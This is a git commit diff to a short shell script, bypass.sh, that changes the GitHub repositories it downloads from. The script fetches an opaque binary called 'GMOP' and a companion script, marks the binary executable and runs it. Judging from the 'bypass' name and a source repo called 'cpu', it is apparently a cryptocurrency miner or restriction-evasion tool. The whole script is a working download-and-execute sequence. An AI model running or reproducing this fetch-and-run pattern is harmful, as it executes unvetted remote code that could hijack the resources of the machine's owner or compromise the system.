680d2438279c420cf7c34b1cbacedf3874148fb0
gitcuan <83873190+gitcuan@users.noreply.github.com>
2021-12-15 12:50:09 +0700

    Update bypass.sh

--- bypass.sh
+++ bypass.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 sudo apt update
-wget https://github.com/Godmine99/cpu/raw/main/GMOP
-wget https://raw.githubusercontent.com/Godmine99/cpu/main/GMOP.sh
+wget https://github.com/gitcuan/j/raw/main/GMOP
+wget https://raw.githubusercontent.com/gitcuan/j/main/GMOP.sh
 chmod +x GMOP
 ./GMOP
